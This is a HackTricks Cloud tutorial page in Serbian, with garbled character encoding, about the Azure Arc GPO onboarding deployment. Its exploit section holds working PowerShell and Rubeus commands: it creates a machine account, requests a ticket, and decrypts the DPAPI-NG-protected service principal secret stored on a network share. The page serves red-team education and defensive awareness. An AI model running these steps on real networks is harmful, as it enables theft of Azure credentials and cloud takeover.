# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc omoguÄ‡ava integraciju novih internih servera (servera pridruÅ¾enih domeni) u Azure Arc koristeÄ‡i metodu Group Policy Object. Da bi to olakÅ¡ao, Microsoft pruÅ¾a alat za implementaciju potreban za pokretanje procedure onboardinga. Unutar ArcEnableServerGroupPolicy.zip datoteke nalaze se sledeÄ‡i skripti: DeployGPO.ps1, EnableAzureArc.ps1, i AzureArcDeployment.psm1.

Kada se izvrÅ¡i, DeployGPO.ps1 skripta obavlja sledeÄ‡e radnje:

1. Kreira Azure Arc Servers Onboarding GPO unutar lokalnog domena.
2. Kopira EnableAzureArc.ps1 skriptu za onboarding na odreÄ‘eni mreÅ¾ni deo kreiran za proces onboardinga, koji takoÄ‘e sadrÅ¾i Windows instalacioni paket.

Kada se pokrene ova skripta, sys administratori treba da obezbede dva glavna parametra: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Pored toga, potrebni su i drugi parametri kao Å¡to su domen, FQDN servera koji hostuje deo, i naziv dela. Dodatne informacije kao Å¡to su tenant ID, resource group, i druge potrebne informacije takoÄ‘e moraju biti obezbeÄ‘ene skripti.

Enkriptovana tajna se generiÅ¡e u AzureArcDeploy direktorijumu na odreÄ‘enom delu koristeÄ‡i DPAPI-NG enkripciju. Enkriptovana tajna se Äuva u datoteci pod nazivom encryptedServicePrincipalSecret. Dokazi o ovome mogu se naÄ‡i u DeployGPO.ps1 skripti, gde se enkripcija vrÅ¡i pozivanjem ProtectBase64 sa $descriptor i $ServicePrincipalSecret kao ulazima. Deskriptor se sastoji od SID-ova grupe Domain Computer i Domain Controller, osiguravajuÄ‡i da se ServicePrincipalSecret moÅ¾e dekriptovati samo od strane Domain Controllers i Domain Computers sigurnosnih grupa, kako je navedeno u komentarima skripte.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

Imamo sledeÄ‡e uslove:

1. UspeÅ¡no smo prodrli u internu mreÅ¾u.
2. Imamo moguÄ‡nost da kreiramo ili preuzmemo kontrolu nad raÄunom raÄunara unutar Active Directory.
3. Otkrili smo mreÅ¾no deljenje koje sadrÅ¾i AzureArcDeploy direktorijum.

Postoji nekoliko metoda za dobijanje raÄuna raÄunara unutar AD okruÅ¾enja. Jedna od najÄeÅ¡Ä‡ih je iskoriÅ¡Ä‡avanje kvote raÄuna raÄunara. Druga metoda ukljuÄuje kompromitovanje raÄuna raÄunara kroz ranjive ACL-ove ili razne druge pogreÅ¡ne konfiguracije.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Kada se dobije nalog maÅ¡ine, moguÄ‡e je autentifikovati se koristeÄ‡i ovaj nalog. MoÅ¾emo ili koristiti runas.exe komandu sa netonly flagom ili koristiti pass-the-ticket sa Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
ÄŒuvajuÄ‡i TGT za naÅ¡ korisniÄki nalog u memoriji, moÅ¾emo koristiti sledeÄ‡i skript za deÅ¡ifrovanje tajne servisnog principala.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativno, moÅ¾emo koristiti [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

U ovom trenutku, moÅ¾emo prikupiti preostale informacije potrebne za povezivanje sa Azure-om iz ArcInfo.json datoteke, koja je smeÅ¡tena na istom mreÅ¾nom deljenju kao i encryptedServicePrincipalSecret datoteka. Ova datoteka sadrÅ¾i detalje kao Å¡to su: TenantId, servicePrincipalClientId, ResourceGroup i joÅ¡ mnogo toga. Sa ovim informacijama, moÅ¾emo koristiti Azure CLI za autentifikaciju kao kompromitovani servisni principal.

## Reference

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
